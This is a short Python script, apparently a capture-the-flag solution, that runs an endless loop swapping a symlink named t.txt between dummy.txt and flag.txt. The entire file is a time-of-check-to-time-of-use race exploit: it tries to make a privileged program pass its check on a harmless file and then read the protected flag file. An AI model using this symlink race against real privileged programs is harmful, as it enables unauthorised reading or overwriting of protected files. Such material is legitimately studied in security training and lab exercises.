from subprocess import call
while True:
    call(["ln", "-sf", "dummy.txt", "t.txt"])
    call(["ln", "-sf", "flag.txt", "t.txt"])

